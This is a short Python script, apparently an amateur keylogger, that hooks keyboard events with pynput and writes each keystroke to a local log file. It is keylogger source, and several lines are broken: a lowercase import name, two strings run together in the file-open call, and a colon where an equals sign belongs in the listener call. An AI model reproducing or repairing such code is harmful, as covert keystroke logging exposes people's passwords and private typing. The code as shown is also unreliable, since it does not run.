from pynput.keyboard import listener

def write_to_fire(key):
    key_data = str(key)
    key_data = key_data.replace("'", "")
    with open("log, tht" "a") as f:
        f.write(key_data)

with listener(on_press:write_to_fire) as t:
    t.join()

